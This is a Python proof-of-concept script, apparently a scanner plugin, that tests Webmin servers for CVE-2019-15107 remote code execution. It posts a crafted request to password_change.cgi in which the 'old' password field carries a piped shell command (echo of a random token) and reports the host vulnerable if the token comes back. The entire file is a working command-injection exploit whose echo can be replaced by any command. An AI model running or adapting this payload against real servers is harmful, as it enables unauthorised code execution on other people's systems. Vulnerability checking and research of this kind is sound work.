#!/usr/bin/env python3

import re
from app.lib.utils.request import request
from app.lib.utils.common import get_capta, get_useragent

class CVE_2019_15107_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-15107 任意代码执行漏洞',
            'description': 'CVE-2019-15107 任意代码执行漏洞,影响范围为: Webmin <=1.920',
            'date': '2019-08-15',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Connection': "close",
            'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
            'Referer': "%s/session_login.cgi" %(self.url),
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.check_payload = "user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % ('echo' + ' ' + self.capta)

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = request.post(self.url + "/password_change.cgi", headers = self.headers, data = self.check_payload)
            if check_req.status_code ==200 and " " in check_req.text and self.capta in check_req.text:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
            pass

if __name__ == "__main__":
    CVE_2019_15107 = CVE_2019_15107_BaseVerify("http://127.0.0.1")
    CVE_2019_15107.check()